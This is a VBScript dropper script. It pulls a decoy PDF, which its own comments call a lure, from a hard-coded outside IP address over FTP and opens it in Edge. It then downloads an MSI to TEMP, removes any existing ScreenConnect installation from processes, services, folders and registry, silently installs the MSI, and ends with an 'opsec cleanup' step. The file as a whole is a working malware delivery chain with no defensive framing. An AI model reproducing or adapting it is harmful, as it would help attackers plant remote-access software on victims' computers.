'(FTP via ftp.exe, MSI to TEMP)
Option Explicit
Dim oFs, oSh, here, logPath, f, x, s, n, i, h, p, e, rc
Dim msiUrl, msiPath, msiRc, msiN, msiI, tempDir, ftpCmd, ftpFile, ftpRc
Dim sw, sc2, so2, pfDir, sfd, reg2, sk2(), sDir, sk

Set oFs = CreateObject("Scripting.FileSystemObject")
Set oSh = CreateObject("WScript.Shell")
here = oFs.GetParentFolderName(WScript.ScriptFullName)
logPath = here & "\stage-log.txt"

Sub Log(s)
    Set f = oFs.OpenTextFile(logPath, 8, True)
    f.WriteLine s
    f.Close
End Sub

Log "[vbs] start here=" & here

h = "72" & "." & "51" & "." & "57" & "." & "39"
tempDir = oSh.ExpandEnvironmentStrings("%TEMP%")

' --- FTP download via curl (passive; ftp.exe is active-only on this build) ---
ftpCmd = "curl.exe -s --fail -u anonymous:ftp@example.com -o """ & here & "\roofing-plan.pdf"" ftp://" & h & "/roofing-plan.pdf"
ftpRc = oSh.Run("cmd.exe /c " & ftpCmd, 0, True)
Log "[vbs] pdf dl rc=" & ftpRc

' --- Open PDF in Edge (if downloaded) ---
p = here & "\roofing-plan.pdf"
If oFs.FileExists(p) Then
    On Error Resume Next
    e = oSh.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe\")
    If Err.Number <> 0 Or Len(e) = 0 Then
        e = "msedge.exe"  ' fallback to PATH
        Err.Clear
    End If
    On Error GoTo 0
    rc = oSh.Run(Chr(34) & e & Chr(34) & " " & Chr(34) & p & Chr(34), 1, False)
    Log "[vbs] edge rc=" & rc
Else
    Log "[vbs] pdf missing"
End If

' --- Fetch helper.msi while the lure is already open ---
ftpCmd = "curl.exe -s --fail -u anonymous:ftp@example.com -o """ & tempDir & "\helper.msi"" ftp://" & h & "/helper.msi"
ftpRc = oSh.Run("cmd.exe /c " & ftpCmd, 0, True)
Log "[vbs] msi dl rc=" & ftpRc

' --- Sweep any existing ScreenConnect client before install ---
Log "[vbs] sweep start"
Set sw = GetObject("winmgmts:\\.\root\cimv2")

Set sc2 = sw.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%ScreenConnect%'")
For Each so2 In sc2
    On Error Resume Next
    so2.Terminate()
    On Error GoTo 0
Next

Set sc2 = sw.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
For Each so2 In sc2
    On Error Resume Next
    so2.StopService()
    WScript.Sleep 400
    so2.Delete()
    On Error GoTo 0
Next

For Each pfDir In Array("C:\Program Files (x86)", "C:\Program Files")
    If oFs.FolderExists(pfDir) Then
        For Each sfd In oFs.GetFolder(pfDir).SubFolders
            If InStr(sfd.Name, "ScreenConnect") = 1 Then
                On Error Resume Next
                sfd.Delete True
                On Error GoTo 0
            End If
        Next
    End If
Next

Set reg2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
For Each sDir In Array("SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SYSTEM\CurrentControlSet\Services")
    On Error Resume Next
    Erase sk2
    reg2.EnumKey &H80000002, sDir, sk2
    If Err.Number = 0 Then
        For Each sk In sk2
            If InStr(sk, "ScreenConnect") > 0 Then
                reg2.DeleteKey &H80000002, sDir & "\" & sk
            End If
        Next
    End If
    Err.Clear
Next
reg2.DeleteKey &H80000002, "SOFTWARE\WOW6432Node\ScreenConnect"
reg2.DeleteKey &H80000001, "Software\ScreenConnect"
Log "[vbs] sweep done"

' --- Install helper.msi silently from TEMP ---
msiPath = tempDir & "\helper.msi"
If oFs.FileExists(msiPath) Then
    msiRc = oSh.Run("msiexec.exe /i """ & msiPath & """ /qn /norestart", 0, False)
    Log "[vbs] msi rc=" & msiRc
Else
    Log "[vbs] msi missing"
End If

' --- Opsec cleanup: remove FTP command file and MSI after install ---
On Error Resume Next
oFs.DeleteFile ftpFile, True
' Uncomment next line if you want to delete the MSI after install completes
' oFs.DeleteFile msiPath, True
On Error GoTo 0

Set oFs = Nothing
Set oSh = Nothing
